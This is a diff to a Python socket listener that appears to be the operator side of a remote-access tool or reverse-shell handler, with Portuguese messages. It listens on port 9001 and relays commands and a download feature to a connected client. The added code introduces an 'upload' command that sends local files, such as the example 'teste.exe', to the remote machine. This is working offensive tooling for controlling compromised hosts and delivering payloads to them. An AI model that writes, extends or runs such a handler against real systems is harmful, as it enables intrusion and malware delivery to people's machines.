@@ -1,4 +1,5 @@
 import socket
+import os
 
 PORT = 9001
 
@@ -51,6 +52,40 @@ while True:
                 print(f"[+] Download concluído: {filename}")
             else:
                 print(header)
+
+        elif command.lower().startswith("upload"):
+                    try:
+                        parts = command.split(" ", 1)
+                        if len(parts) < 2:
+                            print("[!] Erro: Especifique o arquivo. Ex: upload teste.exe")
+                            continue
+                        
+                        filename = parts[1].strip()
+                        filepath = os.path.join(os.getcwd(), filename)
+
+                        if not os.path.exists(filepath):
+                            print(f"[!] Erro: Arquivo {filename} não encontrado localmente.")
+                            continue
+
+                        filesize = os.path.getsize(filepath)
+                        
+                        payload = f"{filename}|{filesize}\n"
+                        conn.send(payload.encode())
+                        
+                        print(f"[*] Enviando '{filename}' ({filesize} bytes)...")
+                        with open(filepath, "rb") as f:
+                            while True:
+                                chunk = f.read(4096)
+                                if not chunk:
+                                    break
+                                conn.send(chunk)
+                        
+                        response = conn.recv(8192).decode(errors="ignore")
+                        print(response.strip())
+
+                    except Exception as e:
+                        print(f"[!] Erro no upload: {e}")
+
         else:
             response = conn.recv(8192).decode(errors="ignore")
             print(response.strip())
